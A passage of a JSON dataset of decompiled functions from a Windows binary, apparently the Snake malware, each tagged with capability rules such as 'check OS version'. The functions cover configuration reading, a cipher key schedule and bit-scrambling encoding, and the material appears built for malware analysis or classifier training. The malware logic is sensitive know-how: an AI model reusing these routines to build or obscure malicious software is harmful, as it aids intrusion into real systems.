'A') && (pcVar1[1] == 'B')) && (pcVar1[2] == 'C')) && (pcVar1[3] == 'D'));\n    pcVar7[1] = uVar6 / 0x1a + 0x41;\n    pcVar7[2] = 'z' - uVar6 % 0x1a;\n    return;\n}\n",
        "token_count": 386
    },
    "200047be": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.200047be(int32_t dest, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint src;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = 0;\n    var_4h = 0;\n    do {\n        iVar1 = sym.inj_snake_Win32.dll_config_read(var_4h + 0x191, &src, 0x104, &var_8h);\n        if (iVar1 == 0) {\n            if (src == '&') {\n                iVar1 = (*_sym.imp.ntdll.dll_strtoul)(&src + 1, 0, 0);\n                if ((iVar1 == 0) || (iVar2 = fcn.2000a70f(iVar1, 0xfffffffe, 1, 0, &src),  iVar2 != 0))\n                goto code_r0x20004871;\n            }\n            else {\n                iVar1 = 0;\n            }\n            iVar2 = sub.ntdll.dll_strlen(&src);\n            if ((arg_ch - iVar3) - 1U <= iVar2 + 1U) {\n                if (iVar1 != 0) {\n                    fcn.2000a924(iVar1);\n                }\n                goto code_r0x2000488b;\n            }\n            sub.ntdll.dll_strcpy(dest + iVar3, &src);\n            iVar1 = sub.ntdll.dll_strlen(&src);\n            iVar3 = iVar3 + 1 + iVar1;\n        }\ncode_r0x20004871:\n        var_4h = var_4h + 1;\n        if (9 < var_4h) {\ncode_r0x2000488b:\n            *(iVar3 + dest) = 0;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 426
    },
    "200146b9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.200146b9(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    uint32_t *puVar22;\n    int32_t iVar23;\n    int32_t iVar24;\n    int32_t iVar25;\n    int32_t iVar26;\n    uint32_t auStack348 [16];\n    uint32_t auStack284 [17];\n    uint32_t auStack216 [4];\n    int32_t iStack200;\n    uint32_t uStack196;\n    uint32_t uStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    int32_t iStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    \n    puVar22 = auStack216;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar22 = 0;\n        puVar22 = puVar22 + 1;\n    }\n    if (0x10 < param_2) {\n        param_2 = 0x10;\n    }\n    iVar4 = 0;\n    if (0 < param_2) {\n        do {\n            auStack216[iVar4] = *(iVar4 + param_3);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < param_2);\n    }\n    *(param_1 + 0x80) = param_2 < 0xb;\n    uVar5 = *(uStack156 * 4 + 0x2002edc8) ^ *(uStack160 * 4 + 0x2002f5c8) ^ *(uStack164 * 4 + 0x2002e9c8) ^\n            *(iStack168 * 4 + 0x2002f1c8) ^ *(iStack184 * 4 + 0x2002f1c8) ^\n            (((auStack216[0] << 8 | auStack216[1]) << 8 | auStack216[2]) << 8 | auStack216[3]);\n    iVar4 = (uVar5 >> 0x18) * 4;\n    iVar6 = (uVar5 >> 0x10 & 0xff) * 4;\n    iVar7 = (uVar5 >> 8 & 0xff) * 4;\n    iVar18 = (uVar5 & 0xff) * 4;\n    uVar16 = *(iVar6 + 0x2002f1c8);\n    uVar8 = *(uStack176 * 4 + 0x2002f5c8) ^ *(iVar18 + 0x2002f5c8) ^ *(iVar7 + 0x2002edc8) ^ *(iVar4 + 0x2002e9c8) ^\n            uVar16 ^ (((iStack184 << 8 | uStack180) << 8 | uStack176) << 8 | uStack172);\n    iVar9 = (uVar8 >> 0x18) * 4;\n    iVar10 = (uVar8 >> 0x10 & 0xff) * 4;\n    iVar11 = (uVar8 >> 8 & 0xff) * 4;\n    uVar1 = *(iVar11 + 0x2002edc8);\n    iVar20 = (uVar8 & 0xff) * 4;\n    uVar2 = *(iVar9 + 0x2002f5c8);\n    uVar12 = *(uStack180 * 4 + 0x2002e9c8) ^ *(iVar20 + 0x2002e9c8) ^ uVar1 ^ *(iVar10 + 0x2002f1c8) ^ uVar2 ^\n             (((iStack168 << 8 | uStack164) << 8 | uStack160) << 8 | uStack156);\n    iVar13 = (uVar12 >> 0x10 & 0xff) * 4;\n    uVar3 = *((uVar12 >> 8 & 0xff) * 4 + 0x2002e9c8);\n    iVar23 = (uVar12 & 0xff) * 4;\n    iVar19 = (uVar12 >> 0x18) * 4;\n    uVar15 = *(iVar13 + 0x2002edc8);\n    uVar14 = *(uStack172 * 4 + 0x2002edc8) ^ *(iVar23 + 0x2002f1c8) ^ *(iVar19 + 0x2002f5c8) ^ uVar3 ^ uVar15 ^\n             (((iStack200 << 8 | uStack196) << 8 | uStack192) << 8 | uStack188);\n    uVar17 = *(iVar11 + 0x2002f5c8);\n    auStack348[0] = *(iVar19 + 0x2002e9c8) ^ *(iVar20 + 0x2002f1c8) ^ *(iVar7 + 0x2002e9c8) ^ uVar17 ^ uVar15;\n    auStack348[1] = *(iVar23 + 0x2002edc8) ^ uVar3 ^ uVar1 ^ *(iVar10 + 0x2002f1c8) ^ uVar2;\n    iVar11 = (uVar14 >> 0x18) * 4;\n    auStack348[2] =\n         *((uVar14 >> 0x10 & 0xff) * 4 + 0x2002edc8) ^ *(iVar11 + 0x2002e9c8) ^ *(iVar13 + 0x2002f1c8) ^\n         *(iVar18 + 0x2002f1c8) ^ *(iVar7 + 0x2002f5c8);\n    auStack348[3] =\n         *((uVar14 >> 8 & 0xff) * 4 + 0x2002e9c8) ^ *((uVar14 & 0xff) * 4 + 0x2002edc8) ^ *(iVar11 + 0x2002f5c8) ^\n         *(iVar4 + 0x2002f5c8) ^ uVar16;\n    uVar12 = *(iVar20 + 0x2002edc8) ^ *(iVar10 + 0x2002e9c8) ^ *(iVar9 + 0x2002f1c8) ^ *(iVar4 + 0x2002f1c8) ^ uVar17 ^\n             uVar12;\n    uVar16 = *((uVar12 >> 8 & 0xff) * 4 + 0x2002edc8);\n    iVar4 = (uVar12 >> 0x18) * 4;\n    iVar19 = (uVar12 >> 0x10 & 0xff) * 4;\n    iVar10 = (uVar12 & 0xff) * 4;\n    uVar5 = *(iVar4 + 0x2002e9c8) ^ *(iVar19 + 0x2002f1c8) ^ *(iVar10 + 0x2002f5c8) ^ uVar16 ^ *(iVar7 + 0x2002f5c8) ^\n            uVar5;\n    uVar1 = *((uVar5 >> 8 & 0xff) * 4 + 0x2002edc8);\n    iVar11 = (uVar5 >> 0x18) * 4;\n    iVar20 = (uVar5 >> 0x10 & 0xff) * 4;\n    iVar23 = (uVar5 & 0xff) * 4;\n    uVar15 = *(iVar6 + 0x2002e9c8) ^ *(iVar11 + 0x2002f5c8) ^ *(iVar20 + 0x2002f1c8) ^ uVar8 ^ uVar1 ^\n             *(iVar23 + 0x2002e9c8);\n    iVar6 = (uVar15 >> 0x18) * 4;\n    iVar13 = (uVar15 >> 0x10 & 0xff) * 4;\n    iVar21 = (uVar15 & 0xff) * 4;\n    iVar24 = (uVar15 >> 8 & 0xff) * 4;\n    uVar14 = *(iVar21 + 0x2002f1c8) ^ *(iVar13 + 0x2002edc8) ^ *(iVar24 + 0x2002e9c8) ^ *(iVar18 + 0x2002edc8) ^\n             *(iVar6 + 0x2002f5c8) ^ uVar14;\n    uVar2 = *((uVar14 >> 0x18) * 4 + 0x2002f1c8);\n    iVar18 = (uVar14 >> 0x10 & 0xff) * 4;\n    auStack348[4] = *(iVar10 + 0x2002e9c8) ^ *(iVar6 + 0x2002e9c8) ^ *(iVar18 + 0x2002f5c8) ^ uVar16 ^ uVar2;\n    iVar7 = (uVar14 & 0xff) * 4;\n    iVar9 = (uVar14 >> 8 & 0xff) * 4;\n    auStack348[5] =\n         *(iVar4 + 0x2002edc8) ^ *(iVar19 + 0x2002e9c8) ^ *(iVar18 + 0x2002edc8) ^ *(iVar9 + 0x2002f1c8) ^\n         *(iVar7 + 0x2002f5c8);\n    auStack348[6] =\n         *(iVar10 + 0x2002f1c8) ^ *(iVar13 + 0x2002f5c8) ^ *(iVar6 + 0x2002f1c8) ^ uVar1 ^ *(iVar23 + 0x2002e9c8);\n    auStack348[7] =\n         *(iVar21 + 0x2002f5c8) ^ *(iVar24 + 0x2002f1c8) ^ *(iVar11 + 0x2002edc8) ^ *(iVar20 + 0x2002e9c8) ^\n         *(iVar23 + 0x2002f5c8);\n    uVar12 = *(iVar18 + 0x2002e9c8) ^ *(iVar9 + 0x2002f5c8) ^ *(iVar7 + 0x2002edc8) ^ *(iVar6 + 0x2002f1c8) ^ uVar2 ^\n             uVar12;\n    iVar4 = (uVar12 >> 0x10 & 0xff) * 4;\n    iVar6 = (uVar12 & 0xff) * 4;\n    iVar20 = (uVar12 >> 0x18) * 4;\n    iVar23 = (uVar12 >> 8 & 0xff) * 4;\n    uVar15 = *(iVar24 + 0x2002f5c8) ^ *(iVar6 + 0x2002f5c8) ^ *(iVar4 + 0x2002f1c8) ^ *(iVar20 + 0x2002e9c8) ^\n             *(iVar23 + 0x2002edc8) ^ uVar15;\n    iVar7 = (uVar15 >> 0x18) * 4;\n    iVar9 = (uVar15 >> 8 & 0xff) * 4;\n    iVar10 = (uVar15 & 0xff) * 4;\n    iVar24 = (uVar15 >> 0x10 & 0xff) * 4;\n    uVar14 = *(iVar13 + 0x2002e9c8) ^ *(iVar24 + 0x2002f1c8) ^ *(iVar7 + 0x2002f5c8) ^ *(iVar10 + 0x2002e9c8) ^\n             *(iVar9 + 0x2002edc8) ^ uVar14;\n    iVar11 = (uVar14 >> 0x18) * 4;\n    iVar13 = (uVar14 >> 8 & 0xff) * 4;\n    iVar18 = (uVar14 & 0xff) * 4;\n    iVar25 = (uVar14 >> 0x10 & 0xff) * 4;\n    uVar5 = *(iVar21 + 0x2002edc8) ^ *(iVar18 + 0x2002f1c8) ^ *(iVar13 + 0x2002e9c8) ^ *(iVar25 + 0x2002edc8) ^\n            *(iVar11 + 0x2002f5c8) ^ uVar5;\n    iVar19 = (uVar5 >> 0x18) * 4;\n    uVar16 = *(iVar4 + 0x2002e9c8);\n    auStack348[8] =\n         *((uVar5 >> 0x10 & 0xff) * 4 + 0x2002f5c8) ^ *(iVar19 + 0x2002f1c8) ^ *(iVar25 + 0x2002e9c8) ^\n         *(iVar6 + 0x2002e9c8) ^ *(iVar23 + 0x2002edc8);\n    auStack348[9] =\n         *((uVar5 >> 8 & 0xff) * 4 + 0x2002f1c8) ^ *((uVar5 & 0xff) * 4 + 0x2002f5c8) ^ *(iVar19 + 0x2002edc8) ^\n         *(iVar20 + 0x2002edc8) ^ uVar16;\n    auStack348[10] =\n         *(iVar25 + 0x2002f5c8) ^ *(iVar11 + 0x2002f1c8) ^ *(iVar23 + 0x2002f1c8) ^ *(iVar10 + 0x2002e9c8) ^\n         *(iVar9 + 0x2002edc8);\n    uVar1 = *(iVar24 + 0x2002e9c8);\n    auStack348[11] =\n         *(iVar18 + 0x2002f5c8) ^ *(iVar13 + 0x2002f1c8) ^ *(iVar7 + 0x2002edc8) ^ uVar1 ^ *(iVar9 + 0x2002f5c8);\n    uVar14 = *(iVar10 + 0x2002edc8) ^ *(iVar7 + 0x2002f1c8) ^ *(iVar20 + 0x2002f1c8) ^ uVar1 ^ *(iVar9 + 0x2002f5c8) ^\n             uVar14;\n    iVar4 = (uVar14 >> 0x18) * 4;\n    iVar19 = (uVar14 >> 8 & 0xff) * 4;\n    iVar9 = (uVar14 & 0xff) * 4;\n    uVar1 = *((uVar14 >> 0x10 & 0xff) * 4 + 0x2002f1c8);\n    uVar12 = *(iVar4 + 0x2002e9c8) ^ *(iVar19 + 0x2002edc8) ^ *(iVar9 + 0x2002f5c8) ^ *(iVar23 + 0x2002f5c8) ^ uVar1 ^\n             uVar12;\n    uVar2 = *((uVar12 >> 0x18) * 4 + 0x2002f5c8);\n    uVar3 = *((uVar12 >> 0x10 & 0xff) * 4 + 0x2002f1c8);\n    iVar10 = (uVar12 >> 8 & 0xff) * 4;\n    iVar18 = (uVar12 & 0xff) * 4;\n    uVar16 = *(iVar10 + 0x2002edc8) ^ *(iVar18 + 0x2002e9c8) ^ uVar15 ^ uVar2 ^ uVar3 ^ uVar16;\n    iVar23 = (uVar16 >> 0x10 & 0xff) * 4;\n    iVar7 = (uVar16 & 0xff) * 4;\n    iVar11 = (uVar16 >> 8 & 0xff) * 4;\n    iVar13 = (uVar16 >> 0x18) * 4;\n    uVar17 = *(iVar7 + 0x2002f1c8) ^ *(iVar6 + 0x2002edc8) ^ *(iVar13 + 0x2002f5c8) ^ uVar5 ^ *(iVar23 + 0x2002edc8) ^\n             *(iVar11 + 0x2002e9c8);\n    auStack348[12] =\n         *(iVar9 + 0x2002e9c8) ^ *(iVar13 + 0x2002e9c8) ^ *(iVar10 + 0x2002f5c8) ^ *(iVar18 + 0x2002f1c8) ^\n         *(iVar23 + 0x2002edc8);\n    uVar15 = *(iVar7 + 0x2002edc8);\n    auStack348[13] = *(iVar18 + 0x2002edc8) ^ uVar15 ^ *(iVar11 + 0x2002e9c8) ^ uVar2 ^ uVar3;\n    iVar10 = (uVar17 >> 0x10 & 0xff) * 4;\n    iVar6 = (uVar17 >> 0x18) * 4;\n    auStack348[14] =\n         *(iVar19 + 0x2002f5c8) ^ *(iVar9 + 0x2002f1c8) ^ *(iVar6 + 0x2002e9c8) ^ *(iVar10 + 0x2002edc8) ^\n         *(iVar13 + 0x2002f1c8);\n    uVar2 = *((uVar17 & 0xff) * 4 + 0x2002edc8);\n    iVar7 = (uVar17 >> 8 & 0xff) * 4;\n    uVar14 = *(iVar6 + 0x2002f1c8) ^ *(iVar10 + 0x2002e9c8) ^ *(iVar7 + 0x2002f5c8) ^ *(iVar13 + 0x2002f1c8) ^ uVar2 ^\n             uVar14;\n    auStack348[15] = *(iVar4 + 0x2002f5c8) ^ *(iVar10 + 0x2002f5c8) ^ *(iVar7 + 0x2002e9c8) ^ uVar1 ^ uVar2;\n    iVar19 = (uVar14 >> 0x10 & 0xff) * 4;\n    iVar18 = (uVar14 & 0xff) * 4;\n    iVar20 = (uVar14 >> 8 & 0xff) * 4;\n    iVar13 = (uVar14 >> 0x18) * 4;\n    uVar16 = *(iVar11 + 0x2002f5c8) ^ *(iVar18 + 0x2002f5c8) ^ *(iVar20 + 0x2002edc8) ^ *(iVar13 + 0x2002e9c8) ^\n             *(iVar19 + 0x2002f1c8) ^ uVar16;\n    iVar4 = (uVar16 >> 0x18) * 4;\n    iVar6 = (uVar16 >> 0x10 & 0xff) * 4;\n    iVar7 = (uVar16 >> 8 & 0xff) * 4;\n    uVar1 = *(iVar7 + 0x2002edc8);\n    iVar21 = (uVar16 & 0xff) * 4;\n    uVar17 = *(iVar23 + 0x2002e9c8) ^ *(iVar21 + 0x2002e9c8) ^ uVar1 ^ *(iVar6 + 0x2002f1c8) ^ *(iVar4 + 0x2002f5c8) ^\n             uVar17;\n    iVar9 = (uVar17 >> 0x18) * 4;\n    iVar10 = (uVar17 >> 0x10 & 0xff) * 4;\n    uVar2 = *((uVar17 >> 8 & 0xff) * 4 + 0x2002e9c8);\n    iVar11 = (uVar17 & 0xff) * 4;\n    uVar12 = *(iVar11 + 0x2002f1c8) ^ *(iVar9 + 0x2002f5c8) ^ uVar15 ^ uVar2 ^ *(iVar10 + 0x2002edc8) ^ uVar12;\n    uVar3 = *(iVar7 + 0x2002f5c8);\n    auStack284[0] =\n         *(iVar9 + 0x2002e9c8) ^ *(iVar21 + 0x2002f1c8) ^ *(iVar20 + 0x2002e9c8) ^ uVar3 ^ *(iVar10 + 0x2002edc8);\n    auStack284[1] = *(iVar11 + 0x2002edc8) ^ uVar2 ^ uVar1 ^ *(iVar6 + 0x2002f1c8) ^ *(iVar4 + 0x2002f5c8);\n    iVar7 = (uVar12 >> 0x18) * 4;\n    auStack284[2] =\n         *((uVar12 >> 0x10 & 0xff) * 4 + 0x2002edc8) ^ *(iVar7 + 0x2002e9c8) ^ *(iVar10 + 0x2002f1c8) ^\n         *(iVar18 + 0x2002f1c8) ^ *(iVar20 + 0x2002f5c8);\n    auStack284[3] =\n         *((uVar12 >> 8 & 0xff) * 4 + 0x2002e9c8) ^ *((uVar12 & 0xff) * 4 + 0x2002edc8) ^ *(iVar7 + 0x2002f5c8) ^\n         *(iVar13 + 0x2002f5c8) ^ *(iVar19 + 0x2002f1c8);\n    uVar17 = *(iVar21 + 0x2002edc8) ^ *(iVar6 + 0x2002e9c8) ^ *(iVar4 + 0x2002f1c8) ^ *(iVar13 + 0x2002f1c8) ^ uVar3 ^\n             uVar17;\n    uVar1 = *((uVar17 >> 8 & 0xff) * 4 + 0x2002edc8);\n    iVar4 = (uVar17 >> 0x18) * 4;\n    iVar24 = (uVar17 >> 0x10 & 0xff) * 4;\n    iVar11 = (uVar17 & 0xff) * 4;\n    uVar14 = *(iVar4 + 0x2002e9c8) ^ *(iVar24 + 0x2002f1c8) ^ *(iVar11 + 0x2002f5c8) ^ uVar1 ^ *(iVar20 + 0x2002f5c8) ^\n             uVar14;\n    iVar20 = (uVar14 & 0xff) * 4;\n    uVar2 = *((uVar14 >> 8 & 0xff) * 4 + 0x2002edc8);\n    iVar25 = (uVar14 >> 0x10 & 0xff) * 4;\n    iVar23 = (uVar14 >> 0x18) * 4;\n    uVar15 = *(iVar19 + 0x2002e9c8) ^ *(iVar23 + 0x2002f5c8) ^ *(iVar25 + 0x2002f1c8) ^ uVar16 ^ uVar2 ^\n             *(iVar20 + 0x2002e9c8);\n    iVar6 = (uVar15 >> 8 & 0xff) * 4;\n    iVar7 = (uVar15 >> 0x18) * 4;\n    iVar26 = (uVar15 >> 0x10 & 0xff) * 4;\n    iVar21 = (uVar15 & 0xff) * 4;\n    uVar12 = *(iVar21 + 0x2002f1c8) ^ *(iVar26 + 0x2002edc8) ^ *(iVar6 + 0x2002e9c8) ^ *(iVar18 + 0x2002edc8) ^\n             *(iVar7 + 0x2002f5c8) ^ uVar12;\n    uVar16 = *((uVar12 >> 0x18) * 4 + 0x2002f1c8);\n    iVar13 = (uVar12 >> 0x10 & 0xff) * 4;\n    auStack284[4] = *(iVar11 + 0x2002e9c8) ^ *(iVar7 + 0x2002e9c8) ^ *(iVar13 + 0x2002f5c8) ^ uVar1 ^ uVar16;\n    iVar9 = (uVar12 & 0xff) * 4;\n    iVar10 = (uVar12 >> 8 & 0xff) * 4;\n    auStack284[5] =\n         *(iVar4 + 0x2002edc8) ^ *(iVar24 + 0x2002e9c8) ^ *(iVar13 + 0x2002edc8) ^ *(iVar10 + 0x2002f1c8) ^\n         *(iVar9 + 0x2002f5c8);\n    auStack284[6] =\n         *(iVar11 + 0x2002f1c8) ^ *(iVar26 + 0x2002f5c8) ^ *(iVar7 + 0x2002f1c8) ^ uVar2 ^ *(iVar20 + 0x2002e9c8);\n    auStack284[7] =\n         *(iVar21 + 0x2002f5c8) ^ *(iVar6 + 0x2002f1c8) ^ *(iVar23 + 0x2002edc8) ^ *(iVar25 + 0x2002e9c8) ^\n         *(iVar20 + 0x2002f5c8);\n    uVar17 = *(iVar13 + 0x2002e9c8) ^ *(iVar10 + 0x2002f5c8) ^ *(iVar9 + 0x2002edc8) ^ *(iVar7 + 0x2002f1c8) ^ uVar16 ^\n             uVar17;\n    iVar4 = (uVar17 >> 0x10 & 0xff) * 4;\n    iVar19 = (uVar17 >> 0x18) * 4;\n    iVar20 = (uVar17 >> 8 & 0xff) * 4;\n    iVar23 = (uVar17 & 0xff) * 4;\n    uVar15 = *(iVar6 + 0x2002f5c8) ^ *(iVar23 + 0x2002f5c8) ^ *(iVar4 + 0x2002f1c8) ^ *(iVar19 + 0x2002e9c8) ^\n             *(iVar20 + 0x2002edc8) ^ uVar15;\n    iVar6 = (uVar15 >> 0x18) * 4;\n    iVar7 = (uVar15 >> 8 & 0xff) * 4;\n    iVar9 = (uVar15 & 0xff) * 4;\n    iVar24 = (uVar15 >> 0x10 & 0xff) * 4;\n    uVar12 = *(iVar26 + 0x2002e9c8) ^ *(iVar24 + 0x2002f1c8) ^ *(iVar6 + 0x2002f5c8) ^ *(iVar9 + 0x2002e9c8) ^\n             *(iVar7 + 0x2002edc8) ^ uVar12;\n    iVar10 = (uVar12 >> 0x18) * 4;\n    iVar11 = (uVar12 >> 8 & 0xff) * 4;\n    iVar13 = (uVar12 & 0xff) * 4;\n    iVar25 = (uVar12 >> 0x10 & 0xff) * 4;\n    uVar14 = *(iVar21 + 0x2002edc8) ^ *(iVar13 + 0x2002f1c8) ^ *(iVar11 + 0x2002e9c8) ^ *(iVar25 + 0x2002edc8) ^\n             *(iVar10 + 0x2002f5c8) ^ uVar14;\n    iVar18 = (uVar14 >> 0x18) * 4;\n    auStack284[8] =\n         *((uVar14 >> 0x10 & 0xff) * 4 + 0x2002f5c8) ^ *(iVar18 + 0x2002f1c8) ^ *(iVar25 + 0x2002e9c8) ^\n         *(iVar23 + 0x2002e9c8) ^ *(iVar20 + 0x2002edc8);\n    uVar16 = *(iVar4 + 0x2002e9c8);\n    auStack284[9] =\n         *((uVar14 >> 8 & 0xff) * 4 + 0x2002f1c8) ^ *((uVar14 & 0xff) * 4 + 0x2002f5c8) ^ *(iVar18 + 0x2002edc8) ^\n         *(iVar19 + 0x2002edc8) ^ uVar16;\n    auStack284[10] =\n         *(iVar25 + 0x2002f5c8) ^ *(iVar10 + 0x2002f1c8) ^ *(iVar20 + 0x2002f1c8) ^ *(iVar9 + 0x2002e9c8) ^\n         *(iVar7 + 0x2002edc8);\n    uVar1 = *(iVar24 + 0x2002e9c8);\n    auStack284[11] =\n         *(iVar13 + 0x2002f5c8) ^ *(iVar11 + 0x2002f1c8) ^ *(iVar6 + 0x2002edc8) ^ uVar1 ^ *(iVar7 + 0x2002f5c8);\n    uVar12 = *(iVar9 + 0x2002edc8) ^ *(iVar6 + 0x2002f1c8) ^ *(iVar19 + 0x2002f1c8) ^ uVar1 ^ *(iVar7 + 0x2002f5c8) ^\n             uVar12;\n    iVar4 = (uVar12 >> 0x18) * 4;\n    iVar13 = (uVar12 >> 8 & 0xff) * 4;\n    iVar7 = (uVar12 & 0xff) * 4;\n    uVar1 = *((uVar12 >> 0x10 & 0xff) * 4 + 0x2002f1c8);\n    uVar17 = *(iVar4 + 0x2002e9c8) ^ *(iVar13 + 0x2002edc8) ^ *(iVar7 + 0x2002f5c8) ^ *(iVar20 + 0x2002f5c8) ^ uVar1 ^\n             uVar17;\n    uVar2 = *((uVar17 >> 0x18) * 4 + 0x2002f5c8);\n    iVar9 = (uVar17 >> 8 & 0xff) * 4;\n    iVar11 = (uVar17 & 0xff) * 4;\n    uVar3 = *((uVar17 >> 0x10 & 0xff) * 4 + 0x2002f1c8);\n    uVar16 = *(iVar9 + 0x2002edc8) ^ *(iVar11 + 0x2002e9c8) ^ uVar15 ^ uVar2 ^ uVar3 ^ uVar16;\n    uVar15 = *((uVar16 >> 0x10 & 0xff) * 4 + 0x2002edc8);\n    uVar17 = *((uVar16 >> 8 & 0xff) * 4 + 0x2002e9c8);\n    iVar6 = (uVar16 & 0xff) * 4;\n    iVar10 = (uVar16 >> 0x18) * 4;\n    uVar16 = *(iVar6 + 0x2002f1c8) ^ *(iVar23 + 0x2002edc8) ^ *(iVar10 + 0x2002f5c8) ^ uVar14 ^ uVar15 ^ uVar17;\n    iVar18 = (uVar16 >> 0x10 & 0xff) * 4;\n    auStack284[12] =\n         *(iVar7 + 0x2002e9c8) ^ *(iVar10 + 0x2002e9c8) ^ *(iVar9 + 0x2002f5c8) ^ *(iVar11 + 0x2002f1c8) ^ uVar15;\n    auStack284[13] = *(iVar6 + 0x2002edc8) ^ *(iVar11 + 0x2002edc8) ^ uVar17 ^ uVar2 ^ uVar3;\n    auStack284[14] =\n         *((uVar16 >> 0x18) * 4 + 0x2002e9c8) ^ *(iVar13 + 0x2002f5c8) ^ *(iVar7 + 0x2002f1c8) ^ *(iVar10 + 0x2002f1c8)\n         ^ *(iVar18 + 0x2002edc8);\n    auStack284[15] =\n         *((uVar16 & 0xff) * 4 + 0x2002edc8) ^ *((uVar16 >> 8 & 0xff) * 4 + 0x2002e9c8) ^ *(iVar4 + 0x2002f5c8) ^\n         *(iVar18 + 0x2002f5c8) ^ uVar1;\n    iVar4 = 0;\n    do {\n        *(param_1 + iVar4 * 8) = auStack348[iVar4];\n        *(param_1 + 4 + iVar4 * 8) = auStack284[iVar4] - 0x10 & 0x1f;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x10);\n    return;\n}\n",
        "token_count": 8183
    },
    "2001bcaa": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.2001bcaa(int32_t s2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puVar2 = (*_sym.imp.msvcrt.dll_malloc)();\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else if (in_EAX < 0xb) {\n        sub.ntdll.dll_memcpy(puVar2, s2);\n    }\n    else {\n        var_8h = 0;\n        iVar4 = in_EAX;\n        do {\n            iVar3 = iVar4 / 10;\n            var_8h = var_8h + iVar4 % 10;\n            iVar4 = iVar3;\n        } while (0 < iVar3);\n        iVar4 = in_EAX / var_8h;\n        iVar3 = 0;\n        var_ch = 0;\n        var_1h._0_1_ = 0;\n        var_14h = 0;\n        if (0 < iVar4) {\n            do {\n                var_10h = 0;\n                do {\n                    if (0 < var_8h) {\n                        puVar5 = var_14h + s2;\n                        var_1ch = var_8h;\n                        do {\n                            var_1h._0_1_ = var_1h | ((*puVar5 & 1 << (var_10h & 0x1f)) >> (var_10h & 0x1f)) <<\n                                                    (var_ch & 0x1f);\n                            var_ch = var_ch + 1;\n                            if (7 < var_ch) {\n                                puVar2[iVar3] = var_1h;\n                                iVar3 = iVar3 + 1;\n                                var_ch = 0;\n                                var_1h._0_1_ = 0;\n                            }\n                            puVar5 = puVar5 + iVar4;\n                            var_1ch = var_1ch + -1;\n                        } while (var_1ch != 0);\n                    }\n                    var_10h = var_10h + 1;\n                } while (var_10h < 8);\n                var_14h = var_14h + 1;\n            } while (var_14h < iVar4);\n        }\n        if (iVar3 < in_EAX) {\n            puVar5 = puVar2 + iVar3;\n            iVar3 = in_EAX - iVar3;\n            puVar6 = puVar2;\n            do {\n                uVar1 = *puVar6;\n                puVar6 = puVar6 + 1;\n                *puVar5 = puVar5[s2 - puVar2] ^ uVar1;\n                puVar5 = puVar5 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return puVar2;\n}\n",
        "token_count": 769
    },
    "2001bda2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.2001bda2(int32_t s2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_EAX < 0xb) {\n        uVar2 = 0;\n    }\n    else {\n        puVar3 = (*_sym.imp.msvcrt.dll_malloc)();\n        if (puVar3 == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memcpy(puVar3, s2);\n            sub.ntdll.dll_memset(s2, 0);\n            iVar6 = 0;\n            iVar5 = in_EAX;\n            do {\n                iVar4 = iVar5 / 10;\n                iVar6 = iVar6 + iVar5 % 10;\n                iVar5 = iVar4;\n            } while (0 < iVar4);\n            iVar5 = in_EAX / iVar6;\n            var_8h = 0;\n            var_1h._0_1_ = *puVar3;\n            var_10h = 0;\n            iVar4 = 1;\n            if (0 < iVar5) {\n                do {\n                    var_ch = 0;\n                    do {\n                        if (0 < iVar6) {\n                            puVar7 = var_10h + s2;\n                            var_14h = iVar6;\n                            do {\n                                *puVar7 = *puVar7 | ((1 << (var_8h & 0x1f) & var_1h) >> (var_8h & 0x1f)) <<\n                                                    (var_ch & 0x1f);\n                                var_8h = var_8h + 1;\n                                if (7 < var_8h) {\n                                    var_1h._0_1_ = puVar3[iVar4];\n                                    iVar4 = iVar4 + 1;\n                                    var_8h = 